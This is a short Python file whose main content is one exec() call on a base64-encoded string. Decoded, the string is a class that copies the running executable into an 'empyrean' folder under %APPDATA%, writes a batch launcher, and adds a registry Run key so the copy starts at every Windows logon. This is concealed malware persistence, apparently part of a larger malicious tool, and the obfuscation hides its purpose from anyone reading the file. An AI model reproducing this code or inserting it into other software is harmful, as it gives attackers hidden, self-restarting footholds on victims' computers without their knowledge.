import subprocess
import os
import shutil
import sys
import base64

exec(base64.b64decode("Y2xhc3MgU3RhcnR1cDoNCiAgICBkZWYgX19pbml0X18oc2VsZikgLT4gTm9uZTogICAgICAgIA0KICAgICAgICBzZWxmLndvcmtpbmdfZGlyID0gb3MuZ2V0ZW52KCJBUFBEQVRBIikgKyAiXFxlbXB5cmVhbiINCiAgICANCiAgICAgICAgaWYgc2VsZi5jaGVja19zZWxmKCk6DQogICAgICAgICAgICByZXR1cm4NCg0KICAgICAgICBzZWxmLm1rZGlyKCkNCiAgICAgICAgc2VsZi53cml0ZV9zdHViKCkNCiAgICAgICAgc2VsZi5yZWdlZGl0KCkNCiAgICANCiAgICBkZWYgY2hlY2tfc2VsZihzZWxmKSAtPiBib29sOg0KICAgICAgICBpZiBvcy5wYXRoLnJlYWxwYXRoKHN5cy5leGVjdXRhYmxlKSA9PSBzZWxmLndvcmtpbmdfZGlyICsgIlxcZGF0LnR4dCI6DQogICAgICAgICAgICByZXR1cm4gVHJ1ZQ0KDQogICAgICAgIHJldHVybiBGYWxzZQ0KICAgIA0KICAgIGRlZiBta2RpcihzZWxmKSAtPiBzdHI6DQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZGlyKHNlbGYud29ya2luZ19kaXIpOg0KICAgICAgICAgICAgb3MubWtkaXIoc2VsZi53b3JraW5nX2RpcikNCiAgICAgICAgDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBzaHV0aWwucm10cmVlKHNlbGYud29ya2luZ19kaXIpDQogICAgICAgICAgICBvcy5ta2RpcihzZWxmLndvcmtpbmdfZGlyKQ0KICAgIA0KICAgIGRlZiB3cml0ZV9zdHViKHNlbGYpIC0+IE5vbmU6DQogICAgICAgIHNodXRpbC5jb3B5Mihvcy5wYXRoLnJlYWxwYXRoKHN5cy5leGVjdXRhYmxlKSwgc2VsZi53b3JraW5nX2RpciArICJcXGRhdC50eHQiKQ0KICAgICAgICANCiAgICAgICAgd2l0aCBvcGVuKGZpbGU9ZiJ7c2VsZi53b3JraW5nX2Rpcn1cXHJ1bi5iYXQiLCBtb2RlPSJ3IikgYXMgZjoNCiAgICAgICAgICAgIGYud3JpdGUoZiJAZWNobyBvZmZcbmNhbGwge3NlbGYud29ya2luZ19kaXJ9XFxkYXQudHh0IikNCiAgICANCiAgICBkZWYgcmVnZWRpdChzZWxmKSAtPiBOb25lOg0KICAgICAgICBzdWJwcm9jZXNzLnJ1bihhcmdzPVsicmVnIiwgImRlbGV0ZSIsICJIS0NVXFxTb2Z0d2FyZVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuIiwgIi92IiwgImVtcHlyZWFuIiwgIi9mIl0sIHNoZWxsPVRydWUpDQogICAgICAgIHN1YnByb2Nlc3MucnVuKGFyZ3M9WyJyZWciLCAiYWRkIiwgIkhLQ1VcXFNvZnR3YXJlXFxNaWNyb3NvZnRcXFdpbmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxSdW4iLCAiL3YiLCAiZW1weXJlYW4iLCAiL3QiLCAiUkVHX1NaIiwgIi9kIiwgZiJ7c2VsZi53b3JraW5nX2Rpcn1cXHJ1bi5iYXQiLCAiL2YiXSwgc2hlbGw9VHJ1ZSk="))
